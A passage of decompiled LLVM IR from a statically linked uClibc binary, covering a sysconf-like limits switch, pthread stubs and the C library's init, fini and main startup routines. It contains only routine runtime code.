    i32 102, label %dec_label_pc_804b1a6
    i32 103, label %dec_label_pc_804b15e
    i32 104, label %dec_label_pc_804b1dc
    i32 105, label %dec_label_pc_804b165
    i32 106, label %dec_label_pc_804b1c7
    i32 107, label %dec_label_pc_804b1c7
    i32 108, label %dec_label_pc_804b1ad
    i32 109, label %dec_label_pc_804b1e3
    i32 110, label %dec_label_pc_804b1f8
    i32 111, label %dec_label_pc_804b16f
    i32 112, label %dec_label_pc_804b179
    i32 113, label %dec_label_pc_804b1f8
    i32 114, label %dec_label_pc_804b180
    i32 115, label %dec_label_pc_804b1a6
    i32 116, label %dec_label_pc_804b1b4
    i32 117, label %dec_label_pc_804b1b4
    i32 118, label %dec_label_pc_804b187
    i32 119, label %dec_label_pc_804b18e
    i32 120, label %dec_label_pc_804b1f1
    i32 121, label %dec_label_pc_804b1dc
    i32 122, label %dec_label_pc_804b1dc
    i32 123, label %dec_label_pc_804b1dc
    i32 124, label %dec_label_pc_804b1dc
    i32 125, label %dec_label_pc_804b070
    i32 126, label %dec_label_pc_804b070
    i32 127, label %dec_label_pc_804b1b4
    i32 128, label %dec_label_pc_804b1b4
    i32 129, label %dec_label_pc_804b070
    i32 130, label %dec_label_pc_804b070
    i32 131, label %dec_label_pc_804b1b4
    i32 149, label %dec_label_pc_804b195
    i32 237, label %dec_label_pc_804b070
    i32 238, label %dec_label_pc_804b070
    i32 239, label %dec_label_pc_804b1b4
    i32 240, label %dec_label_pc_804b1b4
  ]

dec_label_pc_804b070:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b07a:                             ; preds = %entry
  %v1_804b07a = call i32 @__GI___errno_location(i32 %v0_804b05d)
  %v1_804b07f = inttoptr i32 %v1_804b07a to i32*
  store i32 22, i32* %v1_804b07f, align 4
  br label %dec_label_pc_804b1b4

dec_label_pc_804b08a:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b094:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b09e:                             ; preds = %entry
  %v2_804b0a0 = call i32 @getdtablesize(i32 %v0_804b05d, i32 %v0_804b05c)
  br label %dec_label_pc_804b0a5

dec_label_pc_804b0a5:                             ; preds = %entry, %dec_label_pc_804b09e
  br label %dec_label_pc_804b1fd

dec_label_pc_804b0af:                             ; preds = %entry
  %v2_804b0b1 = call i32 @__GI_getpagesize(i32 %v0_804b05d, i32 %v0_804b05c)
  br label %dec_label_pc_804b0b6

dec_label_pc_804b0b6:                             ; preds = %entry, %dec_label_pc_804b0af
  br label %dec_label_pc_804b1fd

dec_label_pc_804b0c0:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b0ca:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b0d4:                             ; preds = %entry
  %v5_804b0d9 = call i32 @__GI_opendir(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8050e8f.72, i32 0, i32 0), i32 %v0_804b05d, i32 %v0_804b05c)
  store i32 %v5_804b0d9, i32* @eax, align 4
  store i32 %v5_804b0d9, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v1_804b0e3 = icmp eq i32 %v5_804b0d9, 0
  %v1_804b0e5 = icmp eq i1 %v1_804b0e3, false
  br i1 %v1_804b0e5, label %dec_label_pc_804b10f.preheader, label %dec_label_pc_804b123

dec_label_pc_804b10f.preheader:                   ; preds = %dec_label_pc_804b0d4
  %tmp1114 = inttoptr i32 %v5_804b0d9 to i32*
  %v3_804b11015 = call i32 @readdir64(i32* %tmp1114)
  %v1_804b11618 = icmp eq i32 %v3_804b11015, 0
  %v1_804b11819 = icmp eq i1 %v1_804b11618, false
  br i1 %v1_804b11819, label %dec_label_pc_804b0e9, label %dec_label_pc_804b11a

dec_label_pc_804b0e9:                             ; preds = %dec_label_pc_804b10f.preheader, %dec_label_pc_804b10f.backedge
  %v3_804b11020 = phi i32 [ %v3_804b110, %dec_label_pc_804b10f.backedge ], [ %v3_804b11015, %dec_label_pc_804b10f.preheader ]
  %v1_804b0e9 = add i32 %v3_804b11020, 18
  %v2_804b0e9 = inttoptr i32 %v1_804b0e9 to i16*
  %v3_804b0e9 = load i16, i16* %v2_804b0e9, align 2
  %v12_804b0e9 = icmp eq i16 %v3_804b0e9, 25348
  %v1_804b0ef = icmp eq i1 %v12_804b0e9, false
  br i1 %v1_804b0ef, label %dec_label_pc_804b10f.backedge, label %dec_label_pc_804b0f1

dec_label_pc_804b0f1:                             ; preds = %dec_label_pc_804b0e9
  %v1_804b0f1 = add i32 %v3_804b11020, 20
  %v2_804b0f1 = inttoptr i32 %v1_804b0f1 to i16*
  %v3_804b0f1 = load i16, i16* %v2_804b0f1, align 2
  %v9_804b0f1 = icmp eq i16 %v3_804b0f1, 30064
  %v1_804b0f7 = icmp eq i1 %v9_804b0f1, false
  br i1 %v1_804b0f7, label %dec_label_pc_804b10f.backedge, label %dec_label_pc_804b0f9

dec_label_pc_804b0f9:                             ; preds = %dec_label_pc_804b0f1
  %v1_804b0f9 = add i32 %v3_804b11020, 22
  %v2_804b0f9 = inttoptr i32 %v1_804b0f9 to i8*
  %v3_804b0f9 = load i8, i8* %v2_804b0f9, align 1
  %v4_804b0f9 = zext i8 %v3_804b0f9 to i32
  %v0_804b0fd = load i32, i32* @global_var_8053338, align 8
  %v2_804b102 = mul nuw nsw i32 %v4_804b0f9, 2
  %v3_804b102 = add i32 %v2_804b102, %v0_804b0fd
  %v4_804b102 = inttoptr i32 %v3_804b102 to i16*
  %v5_804b102 = load i16, i16* %v4_804b102, align 2
  %v1_804b106 = and i16 %v5_804b102, 8
  %v2_804b106 = icmp eq i16 %v1_804b106, 0
  %v0_804b10c = load i32, i32* @esi, align 4
  %v2_804b10c = zext i1 %v2_804b106 to i32
  %v3_804b10c = add i32 %v0_804b10c, 1
  %v4_804b10c = add i32 %v3_804b10c, %v2_804b10c
  store i32 %v4_804b10c, i32* @esi, align 4
  br label %dec_label_pc_804b10f.backedge

dec_label_pc_804b10f.backedge:                    ; preds = %dec_label_pc_804b0f9, %dec_label_pc_804b0e9, %dec_label_pc_804b0f1
  %v0_804b10f.pre = load i32, i32* @ebx, align 4
  %tmp11 = inttoptr i32 %v0_804b10f.pre to i32*
  %v3_804b110 = call i32 @readdir64(i32* %tmp11)
  %v1_804b116 = icmp eq i32 %v3_804b110, 0
  %v1_804b118 = icmp eq i1 %v1_804b116, false
  br i1 %v1_804b118, label %dec_label_pc_804b0e9, label %dec_label_pc_804b11a

dec_label_pc_804b11a:                             ; preds = %dec_label_pc_804b10f.backedge, %dec_label_pc_804b10f.preheader
  %v0_804b11a = load i32, i32* @ebx, align 4
  %tmp12 = inttoptr i32 %v0_804b11a to i32*
  %v3_804b11b = call i32 @__GI_closedir(i32* %tmp12)
  %v0_804b12a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b12a

dec_label_pc_804b123:                             ; preds = %dec_label_pc_804b0d4
  %v2_804b123 = load i32, i32* %stack_var_-8, align 4
  %v3_804b123 = call i32 @nprocessors_onln(i32 ptrtoint ([24 x i8]* @global_var_8050e8f.72 to i32), i32 %v2_804b123)
  br label %dec_label_pc_804b12a

dec_label_pc_804b12a:                             ; preds = %dec_label_pc_804b11a, %dec_label_pc_804b123
  %v0_804b12e = phi i32 [ %v0_804b12a.pre, %dec_label_pc_804b11a ], [ %v3_804b123, %dec_label_pc_804b123 ]
  %v1_804b12a = icmp eq i32 %v0_804b12e, 0
  %v1_804b12c = icmp eq i1 %v1_804b12a, false
  br i1 %v1_804b12c, label %dec_label_pc_804b132, label %dec_label_pc_804b12e

dec_label_pc_804b12e:                             ; preds = %dec_label_pc_804b12a
  %v1_804b12e = and i32 %v0_804b12e, -65536
  %v2_804b12e = or i32 %v1_804b12e, 1
  br label %dec_label_pc_804b132

dec_label_pc_804b132:                             ; preds = %dec_label_pc_804b12a, %dec_label_pc_804b12e
  %v0_804b132 = phi i32 [ %v0_804b12e, %dec_label_pc_804b12a ], [ %v2_804b12e, %dec_label_pc_804b12e ]
  br label %dec_label_pc_804b1fd

dec_label_pc_804b139:                             ; preds = %entry
  %v2_804b13b = call i32 @nprocessors_onln(i32 %v0_804b05d, i32 %v0_804b05c)
  br label %dec_label_pc_804b140

dec_label_pc_804b140:                             ; preds = %entry, %dec_label_pc_804b139
  br label %dec_label_pc_804b1fd

dec_label_pc_804b14a:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b154:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b15e:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b165:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b16f:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b179:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b180:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b187:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b18e:                             ; preds = %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b195:                             ; preds = %entry
  %v6_804b199 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 %v0_804b05d, i32 %v0_804b05c)
  %v2_804b1a0 = icmp slt i32 %v6_804b199, 0
  %v1_804b1a2 = icmp eq i1 %v2_804b1a0, false
  br i1 %v1_804b1a2, label %dec_label_pc_804b1b9, label %dec_label_pc_804b1b4

dec_label_pc_804b1a6:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1ad:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1b4:                             ; preds = %dec_label_pc_804b195, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b07a
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1b9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b195
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1c0:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1c7:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1ce:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1d5:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1dc:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1e3:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1ea:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1f1:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1f8:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b1fd

dec_label_pc_804b1fd:                             ; preds = %dec_label_pc_804b1f1, %dec_label_pc_804b1ea, %dec_label_pc_804b1e3, %dec_label_pc_804b1dc, %dec_label_pc_804b1d5, %dec_label_pc_804b1ce, %dec_label_pc_804b1c7, %dec_label_pc_804b1c0, %dec_label_pc_804b1ad, %dec_label_pc_804b1a6, %dec_label_pc_804b1b9, %dec_label_pc_804b18e, %dec_label_pc_804b187, %dec_label_pc_804b180, %dec_label_pc_804b179, %dec_label_pc_804b16f, %dec_label_pc_804b165, %dec_label_pc_804b15e, %dec_label_pc_804b154, %dec_label_pc_804b14a, %dec_label_pc_804b140, %dec_label_pc_804b132, %dec_label_pc_804b0ca, %dec_label_pc_804b0c0, %dec_label_pc_804b0b6, %dec_label_pc_804b0a5, %dec_label_pc_804b094, %dec_label_pc_804b08a, %dec_label_pc_804b070, %dec_label_pc_804b1b4, %dec_label_pc_804b1f8
  %v0_804b1ff = phi i32 [ 2048, %dec_label_pc_804b1f1 ], [ 99, %dec_label_pc_804b1ea ], [ 20, %dec_label_pc_804b1e3 ], [ 2147483647, %dec_label_pc_804b1dc ], [ 1024, %dec_label_pc_804b1d5 ], [ 4, %dec_label_pc_804b1ce ], [ 32, %dec_label_pc_804b1c7 ], [ 256, %dec_label_pc_804b1c0 ], [ 16, %dec_label_pc_804b1ad ], [ 255, %dec_label_pc_804b1a6 ], [ 200112, %dec_label_pc_804b1b9 ], [ 9, %dec_label_pc_804b18e ], [ 65535, %dec_label_pc_804b187 ], [ -32768, %dec_label_pc_804b180 ], [ -128, %dec_label_pc_804b179 ], [ 127, %dec_label_pc_804b16f ], [ -2147483648, %dec_label_pc_804b165 ], [ 0, %dec_label_pc_804b15e ], [ 8, %dec_label_pc_804b154 ], [ 500, %dec_label_pc_804b14a ], [ 4096, %dec_label_pc_804b140 ], [ %v0_804b132, %dec_label_pc_804b132 ], [ 16384, %dec_label_pc_804b0ca ], [ 1000, %dec_label_pc_804b0c0 ], [ 32768, %dec_label_pc_804b0b6 ], [ 6, %dec_label_pc_804b0a5 ], [ 65536, %dec_label_pc_804b094 ], [ 100, %dec_label_pc_804b08a ], [ 1, %dec_label_pc_804b070 ], [ -1, %dec_label_pc_804b1b4 ], [ 32767, %dec_label_pc_804b1f8 ]
  ret i32 %v0_804b1ff

; uselistorder directives
  uselistorder i32 %v3_804b110, { 1, 0 }
  uselistorder i32 %v3_804b11020, { 0, 2, 1 }
  uselistorder i32 %v0_804b05d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804b05c, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @nprocessors_onln, { 1, 0 }
  uselistorder i32 (i32*)* @readdir64, { 1, 0 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 95, { 3, 2, 0, 1 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 13, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b1fd, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 10, 29, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_804b1b9, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804b1b4, { 0, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder label %dec_label_pc_804b140, { 1, 0 }
  uselistorder label %dec_label_pc_804b132, { 1, 0 }
  uselistorder label %dec_label_pc_804b12a, { 1, 0 }
  uselistorder label %dec_label_pc_804b10f.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b0e9, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b6, { 1, 0 }
  uselistorder label %dec_label_pc_804b0a5, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  store i32 %arg3, i32* @edx, align 4
  %v2_804b214 = add i32 %tmp3, 4
  %v3_804b214 = inttoptr i32 %v2_804b214 to i32*
  store i32 %arg3, i32* %v3_804b214, align 4
  ret i32 %tmp3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804b21c = icmp eq i32 %arg2, 0
  br i1 %v4_804b21c, label %dec_label_pc_804b22e, label %dec_label_pc_804b223

dec_label_pc_804b223:                             ; preds = %entry
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_804b223 = add i32 %tmp2, 4
  %v2_804b223 = inttoptr i32 %v1_804b223 to i32*
  %v3_804b223 = load i32, i32* %v2_804b223, align 4
  %v2_804b22a = load i32, i32* %arg1, align 4
  store i32 %v2_804b22a, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %v2_804b22a)
  br label %dec_label_pc_804b22e

dec_label_pc_804b22e:                             ; preds = %entry, %dec_label_pc_804b223
  %.0 = phi i32 [ undef, %entry ], [ %v3_804b223, %dec_label_pc_804b223 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_804b22e, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b22f = load i32, i32* @ebx, align 4
  store i32 %v0_804b22f, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32 0), label %dec_label_pc_804b240, label %dec_label_pc_804b24d

dec_label_pc_804b240:                             ; preds = %entry, %dec_label_pc_804b240
  %v1_804b2476 = phi i32 [ %v1_804b247, %dec_label_pc_804b240 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804b247.74 to i32), i32* %stack_var_-8, align 4
  %v5_804b240 = mul i32 %v1_804b2476, 4
  %v6_804b240 = add i32 %v5_804b240, ptrtoint (i32* @global_var_8053300.73 to i32)
  %v7_804b240 = inttoptr i32 %v6_804b240 to i32*
  %v8_804b240 = load i32, i32* %v7_804b240, align 4
  call void @__pseudo_call(i32 %v8_804b240)
  %v0_804b247.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b247 = add i32 %v0_804b247.pre, -1
  store i32 %v1_804b247, i32* %ebx.global-to-local, align 4
  %v10_804b248 = icmp eq i32 %v0_804b247.pre, 0
  %v1_804b24b = icmp eq i1 %v10_804b248, false
  br i1 %v1_804b24b, label %dec_label_pc_804b240, label %dec_label_pc_804b24d

dec_label_pc_804b24d:                             ; preds = %dec_label_pc_804b240, %entry
  %v0_804b24d = load i32, i32* @global_var_80537b8.75, align 8
  %v1_804b252 = icmp eq i32 %v0_804b24d, 0
  br i1 %v1_804b252, label %dec_label_pc_804b258, label %dec_label_pc_804b256

dec_label_pc_804b256:                             ; preds = %dec_label_pc_804b24d
  %v0_804b256 = load i32, i32* %stack_var_-8, align 4
  %v1_804b256 = call i32 @unknown_0(i32 %v0_804b256)
  br label %dec_label_pc_804b258

dec_label_pc_804b258:                             ; preds = %dec_label_pc_804b256, %dec_label_pc_804b24d
  %v0_804b2663 = phi i32 [ %v1_804b256, %dec_label_pc_804b256 ], [ 0, %dec_label_pc_804b24d ]
  %v0_804b258 = load i32, i32* @global_var_80537bc.76, align 4
  %v1_804b25e = icmp eq i32 %v0_804b258, 0
  br i1 %v1_804b25e, label %dec_label_pc_804b265, label %dec_label_pc_804b262

dec_label_pc_804b262:                             ; preds = %dec_label_pc_804b258
  %v2_804b262 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b262, i32* %ebx.global-to-local, align 4
  %v1_804b263 = call i32 @unknown_0(i32 %v2_804b262)
  br label %dec_label_pc_804b265

dec_label_pc_804b265:                             ; preds = %dec_label_pc_804b262, %dec_label_pc_804b258
  %v0_804b266 = phi i32 [ %v1_804b263, %dec_label_pc_804b262 ], [ %v0_804b2663, %dec_label_pc_804b258 ]
  %v2_804b265 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b265, i32* @ebx, align 4
  ret i32 %v0_804b266

; uselistorder directives
  uselistorder i32 %v1_804b247, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804b240, { 1, 0 }
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b267 = load i32, i32* @esi, align 4
  %v0_804b268 = load i32, i32* @ebx, align 4
  store i32 %v0_804b268, i32* %stack_var_-8, align 4
  %v0_804b269 = load i32, i32* @eax, align 4
  store i32 %v0_804b269, i32* @esi, align 4
  %v0_804b26b = load i32, i32* @edx, align 4
  store i32 %v0_804b26b, i32* @ebx, align 4
  %v4_804b270 = call i32 @__libc_fcntl(i32 %v0_804b269, i32 1, i32 %v0_804b268)
  %v1_804b277 = add i32 %v4_804b270, 1
  %v8_804b277 = icmp eq i32 %v1_804b277, 0
  %v1_804b278 = icmp eq i1 %v8_804b277, false
  br i1 %v1_804b278, label %dec_label_pc_804b290, label %dec_label_pc_804b27a

dec_label_pc_804b27a:                             ; preds = %entry
  %v0_804b27a = load i32, i32* @ebx, align 4
  %v4_804b280 = call i32 @__GI_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8051270.77, i32 0, i32 0), i32 %v0_804b27a)
  %v1_804b287 = load i32, i32* @esi, align 4
  %v12_804b287 = icmp eq i32 %v4_804b280, %v1_804b287
  br i1 %v12_804b287, label %dec_label_pc_804b290, label %dec_label_pc_804b28b

dec_label_pc_804b28b:                             ; preds = %dec_label_pc_804b27a
  %v0_804b28b = call i32 @abort()
  br label %dec_label_pc_804b290

dec_label_pc_804b290:                             ; preds = %entry, %dec_label_pc_804b27a, %dec_label_pc_804b28b
  %v0_804b292 = phi i32 [ %v1_804b277, %entry ], [ %v4_804b280, %dec_label_pc_804b27a ], [ %v0_804b28b, %dec_label_pc_804b28b ]
  %v2_804b290 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b290, i32* @ebx, align 4
  store i32 %v0_804b267, i32* @esi, align 4
  ret i32 %v0_804b292

; uselistorder directives
  uselistorder i32 %v4_804b280, { 1, 0 }
  uselistorder label %dec_label_pc_804b290, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804b293 = load i32, i32* @global_var_80537b4.78, align 4
  %v1_804b293 = icmp eq i32 %v0_804b293, 0
  %v1_804b29a = icmp eq i1 %v1_804b293, false
  br i1 %v1_804b29a, label %entry.dec_label_pc_804b2c2_crit_edge, label %dec_label_pc_804b29c

entry.dec_label_pc_804b2c2_crit_edge:             ; preds = %entry
  %v0_804b2c2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804b2c2

dec_label_pc_804b29c:                             ; preds = %entry
  store i32 4096, i32* @global_var_80537b4.78, align 4
  %v0_804b2bd = call i32 @_stdio_init()
  br label %dec_label_pc_804b2c2

dec_label_pc_804b2c2:                             ; preds = %entry.dec_label_pc_804b2c2_crit_edge, %dec_label_pc_804b29c
  %v0_804b2c2 = phi i32 [ %v0_804b2c2.pre, %entry.dec_label_pc_804b2c2_crit_edge ], [ %v0_804b2bd, %dec_label_pc_804b29c ]
  ret i32 %v0_804b2c2

; uselistorder directives
  uselistorder label %dec_label_pc_804b2c2, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp34 = ptrtoint i32* %arg3 to i32
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %tmp34, i32* @ebp, align 4
  store i32 %arg6, i32* @global_var_80537ac.79, align 4
  store i32 %arg5, i32* @global_var_80537bc.76, align 4
  %v2_804b2f0 = mul i32 %arg2, 4
  store i32 %v2_804b2f0, i32* %edx.global-to-local, align 4
  %v2_804b2f3 = add i32 %v2_804b2f0, 4
  %v3_804b2f3 = add i32 %v2_804b2f3, %tmp34
  store i32 %v3_804b2f3, i32* %eax.global-to-local, align 4
  store i32 %v3_804b2f3, i32* @global_var_80537b0.80, align 16
  %v3_804b2fc = load i32, i32* %arg3, align 4
  %v14_804b2fc = icmp eq i32 %v3_804b2f3, %v3_804b2fc
  %v1_804b2ff = icmp eq i1 %v14_804b2fc, false
  br i1 %v1_804b2ff, label %dec_label_pc_804b30a, label %dec_label_pc_804b301

dec_label_pc_804b301:                             ; preds = %entry
  %v2_804b301 = add i32 %tmp34, %v2_804b2f0
  store i32 %v2_804b301, i32* %eax.global-to-local, align 4
  store i32 %v2_804b301, i32* @global_var_80537b0.80, align 16
  br label %dec_label_pc_804b30a

dec_label_pc_804b30a:                             ; preds = %entry, %dec_label_pc_804b301
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804b311 = ptrtoint i32* %stack_var_-136 to i32
  %tmp46 = bitcast i32* %stack_var_-136 to i8*
  %v5_804b315 = call i8* @_memset(i8* %tmp46, i32 0, i32 30)
  %v6_804b315 = ptrtoint i8* %v5_804b315 to i32
  store i32 %v6_804b315, i32* %ecx.global-to-local, align 4
  %storemerge.pre = load i32, i32* @global_var_80537b0.80, align 4
  br label %dec_label_pc_804b320

dec_label_pc_804b320:                             ; preds = %dec_label_pc_804b320, %dec_label_pc_804b30a
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_804b30a ], [ %v1_804b323, %dec_label_pc_804b320 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804b320 = inttoptr i32 %storemerge to i32*
  %v2_804b320 = load i32, i32* %v1_804b320, align 4
  %v3_804b320 = icmp eq i32 %v2_804b320, 0
  %v1_804b323 = add i32 %storemerge, 4
  store i32 %v1_804b323, i32* @esi, align 4
  %v1_804b326 = icmp eq i1 %v3_804b320, false
  br i1 %v1_804b326, label %dec_label_pc_804b320, label %dec_label_pc_804b328

dec_label_pc_804b328:                             ; preds = %dec_label_pc_804b320
  store i32 %v1_804b323, i32* %ecx.global-to-local, align 4
  store i32 %v2_804b311, i32* %edx.global-to-local, align 4
  %v1_804b3416 = inttoptr i32 %v1_804b323 to i32*
  %v2_804b3417 = load i32, i32* %v1_804b3416, align 4
  %v3_804b3418 = icmp eq i32 %v2_804b3417, 0
  %v1_804b34415 = icmp eq i1 %v3_804b3418, false
  br i1 %v1_804b34415, label %dec_label_pc_804b330.lr.ph, label %dec_label_pc_804b346

dec_label_pc_804b330.lr.ph:                       ; preds = %dec_label_pc_804b328
  %v7_804b33c = load i1, i1* @df, align 1
  %v8_804b33c = select i1 %v7_804b33c, i32 -4, i32 4
  br label %dec_label_pc_804b330

dec_label_pc_804b330:                             ; preds = %dec_label_pc_804b330.lr.ph, %dec_label_pc_804b33e
  %v1_804b337 = phi i32 [ %v2_804b3417, %dec_label_pc_804b330.lr.ph ], [ %v2_804b341, %dec_label_pc_804b33e ]
  %v0_804b33a = phi i32 [ %v1_804b323, %dec_label_pc_804b330.lr.ph ], [ %v1_804b33e, %dec_label_pc_804b33e ]
  store i32 %v1_804b337, i32* %eax.global-to-local, align 4
  %v6_804b335 = icmp ugt i32 %v1_804b337, 14
  br i1 %v6_804b335, label %dec_label_pc_804b33e, label %dec_label_pc_804b337

dec_label_pc_804b337:                             ; preds = %dec_label_pc_804b330
  %v1_804b330 = inttoptr i32 %v0_804b33a to i32*
  %v0_804b337 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b337 = mul i32 %v1_804b337, 8
  %v3_804b337 = add i32 %v0_804b337, %v2_804b337
  store i32 %v3_804b337, i32* %edi.global-to-local, align 4
  store i32 %v0_804b33a, i32* %esi.global-to-local, align 4
  %v2_804b33c = load i32, i32* %v1_804b330, align 4
  %v4_804b33c = inttoptr i32 %v3_804b337 to i32*
  store i32 %v2_804b33c, i32* %v4_804b33c, align 4
  %v5_804b33c = load i32, i32* %edi.global-to-local, align 4
  %v6_804b33c = load i32, i32* %esi.global-to-local, align 4
  %v9_804b33c = add i32 %v5_804b33c, %v8_804b33c
  %v10_804b33c = add i32 %v6_804b33c, %v8_804b33c
  store i32 %v9_804b33c, i32* %edi.global-to-local, align 4
  store i32 %v10_804b33c, i32* %esi.global-to-local, align 4
  %v1_804b33d = inttoptr i32 %v10_804b33c to i32*
  %v2_804b33d = load i32, i32* %v1_804b33d, align 4
  %v4_804b33d = inttoptr i32 %v9_804b33c to i32*
  store i32 %v2_804b33d, i32* %v4_804b33d, align 4
  %v6_804b33d = load i32, i32* %esi.global-to-local, align 4
  %v10_804b33d = add i32 %v6_804b33d, %v8_804b33c
